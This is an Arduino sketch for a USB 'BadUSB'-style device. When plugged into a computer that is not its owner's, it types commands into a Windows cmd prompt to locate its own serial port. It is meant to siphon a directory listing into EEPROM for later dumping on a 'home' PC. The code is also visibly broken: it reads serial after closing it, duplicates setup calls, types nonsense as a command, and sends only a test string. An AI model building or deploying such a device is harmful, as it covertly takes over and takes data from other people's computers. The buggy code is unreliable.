/*
 * 16u2 HID‑keyboard + CDC receiver
 *  – Foreign PC : grab dir listing, store up to 500 B in EEPROM.
 *  – Home PC    : on token "PC1", dump stored bytes back out.
 *
 * Board   : “Arduino HoodLoader2 16u2”
 * Library : <Keyboard.h>, <avr/eeprom.h>
 */

#include <Keyboard.h>
#include <avr/eeprom.h>

#define BAUD                115200
#define HANDSHAKE_TOKEN     "PC1"      // sent by your own PC at boot
#define MAX_BYTES           500

const uint32_t TOKEN_WINDOW = 3000;    // 3 s to see PC1
const uint32_t CAP_IDLE_MS  = 2000;    // stop capture after 2 s silence

/* ---------- helpers ---------- */
void pressWinR() {
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r');
  delay(120); Keyboard.releaseAll(); delay(350);
}

void typeSlow(const char *s) {
  while (*s) { Keyboard.write(*s++); delay(6); }
}

/* ---------- capture dir bytes ---------- */
void captureToEeprom() {
  uint32_t idle = millis();
  uint16_t idx  = 0;
  while (millis() - idle < CAP_IDLE_MS) {
    if (Serial.available()) {
      idle = millis();
      uint8_t b = Serial.read();
      if (idx < MAX_BYTES)  eeprom_write_byte((uint8_t*)idx++, b);
    }
  }
  eeprom_write_word((uint16_t*)MAX_BYTES, idx);   // store length at end
}

/* ---------- dump cached data ---------- */
void dumpFromEeprom() {
  uint16_t len = eeprom_read_word((uint16_t*)MAX_BYTES);
  for (uint16_t i = 0; i < len; ++i) {
    Serial.write(eeprom_read_byte((uint8_t*)i));
  }
}

/* ---------- setup ---------- */
void setup() {
  /* start CDC so Windows enumerates, then close so macro can reopen */
  Serial.begin(BAUD);
  delay(500);
  Serial.end();

  /* wait up to TOKEN_WINDOW for "PC1" */
  uint32_t t0 = millis();
  char buf[4] = {0};
  uint8_t pos = 0;
  while (millis() - t0 < TOKEN_WINDOW) {
    if (Serial.available()) {                 // still open from Windows side
      buf[pos++] = Serial.read();
      if (pos == 3) break;
    }
  }

  bool isHome = (strncmp(buf, HANDSHAKE_TOKEN, 3) == 0);

  Keyboard.begin();

  if (!isHome) {
    /* ---------- foreign PC macro ---------- */
    pressWinR();
    typeSlow("cmd"); Keyboard.write(KEY_RETURN); delay(400);
    typeSlow("not my computer"); Keyboard.write(KEY_RETURN); delay(400);
    /* build COM macro using Windows variable %CD% just to get any prompt */
    typeSlow("for /f %A in ('wmic path Win32_SerialPort where \"PNPDeviceID like"
             " '%VID_2341%PID_484C%'\" get DeviceID ^| find \"COM\"') do set p=%A");
    Keyboard.write(KEY_RETURN); delay(300);

    typeSlow("mode %p%:115200,n,8,1");         // set baud
    Keyboard.write(KEY_RETURN); delay(150);

    typeSlow("echo TEST123 > \\\\.\\%p%");
    Keyboard.write(KEY_RETURN); delay(150);

  }

  /* re‑open CDC and either capture or dump */
  Serial.begin(BAUD);
  delay(1000);

Serial.begin(BAUD);
delay(500);
Serial.println("DEBUG: looking for token...");
Serial.end();

  if (!isHome) {
    captureToEeprom();
    Serial.println(String("CAPTURED=") + eeprom_read_word((uint16_t*)MAX_BYTES));

  } else {
    dumpFromEeprom();
  }
}

void loop() {}
